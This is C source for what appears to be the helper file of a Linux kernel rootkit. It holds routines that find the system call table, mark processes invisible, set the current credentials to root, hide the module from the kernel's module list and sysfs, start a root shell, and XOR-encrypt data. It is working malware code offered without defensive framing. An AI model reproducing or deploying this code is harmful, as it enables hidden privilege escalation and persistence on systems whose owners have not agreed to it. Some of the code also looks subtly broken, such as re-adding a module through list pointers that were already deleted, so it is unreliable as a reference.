#include "inc/utils.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>

extern struct module *THIS_MODULE;
extern unsigned long *__sys_call_table;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

unsigned long *get_syscall_table(void) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    unsigned long (*kallsyms_lookup_name)(const char *name);
    register_kprobe(&kp);
    kallsyms_lookup_name = (unsigned long (*)(const char *)) kp.addr;
    unregister_kprobe(&kp);

    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
#else
    unsigned long *syscall_table;
    unsigned long i;

    for (i = (unsigned long)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;
        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
#endif
}

struct task_struct *find_task(pid_t pid) {
    struct task_struct *p = current;
    for_each_process(p) {
        if (p->pid == pid)
            return p;
    }
    return NULL;
}

int is_invisible(pid_t pid) {
    struct task_struct *task;
    if (!pid)
        return 0;
    task = find_task(pid);
    if (!task)
        return 0;
    if (task->flags & PF_INVISIBLE)
        return 1;
    return 0;
}

void give_root(void) {
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (!newcreds)
        return;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
#endif

    commit_creds(newcreds);
}

void module_hide(void) {
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

void module_show(void) {
    list_add(&THIS_MODULE->list, THIS_MODULE->list.prev);
    kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
}

void drop_shell(void) {
    if (capable(CAP_SYS_ADMIN)) {
        give_root();
        call_usermodehelper("/bin/sh", NULL, NULL, UMH_WAIT_EXEC);
    }
}

int encrypt_decrypt(char *data, size_t len) {
    size_t i;
    for (i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
    return 0;
}
